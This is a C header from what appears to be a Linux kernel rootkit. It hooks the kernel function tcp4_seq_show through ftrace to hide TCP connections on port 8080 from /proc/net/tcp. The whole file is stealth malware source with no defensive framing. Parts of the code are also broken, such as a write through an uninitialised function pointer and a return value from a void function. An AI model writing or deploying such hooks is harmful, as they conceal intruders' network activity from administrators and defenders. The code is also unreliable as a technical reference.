#ifndef HIDE_PROC_NET_H
#define HIDE_PROC_NET_H
#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/seq_file.h>
#include <linux/namei.h>
#include "seq.h"
#include <linux/ftrace.h>
#include <linux/slab.h>
#include <linux/uaccess.h>
#include <linux/linkage.h>



#include <linux/tcp.h>

static asmlinkage long (*org_tcp4_seq_show)(struct seq_file *seq, void *v);
unsigned long tcp4_addr;
struct ftrace_ops ops;

static asmlinkage int hook_org_tcp4_seq_show(struct seq_file *seq, void *v)
{
    struct sock *sk = v;
    if (sk->sk_num == 0x1f90)
        return 0;
    return org_tcp4_seq_show(seq, v);

}
static void notrace fh_ftrace(unsigned long ip, unsigned long parent_ip, struct ftrace_ops *ops, struct pt_regs *regs)
{
    //struct hook *hook = container_of(ops, struct ftrac_hooks, ops);
    if (!within_module(parent_ip, THIS_MODULE))
        regs->ip = (unsigned long) hook_org_tcp4_seq_show;
}








void get_addr(void)
{
    int err;
    tcp4_addr = kallsyms_lookup_name("tcp4_seq_show");
    ops.func = fh_ftrace;
    ops.flags = FTRACE_OPS_FL_SAVE_REGS
                | FTRACE_OPS_FL_RECURSION_SAFE
                | FTRACE_OPS_FL_IPMODIFY;
    
    *((unsigned long *) org_tcp4_seq_show) = tcp4_addr;
    err = ftrace_set_filter_ip(&ops, tcp4_addr, 0, 0);
    if (err)
    {
        printk(KERN_ALERT "rk: ftrace_set_filter_ip");
        return err;
    }
    err = register_ftrace_function(&ops);
    if (err)
    {
        printk(KERN_ALERT "rk: register_ftrace_function");

    }
}
                                                  
#endif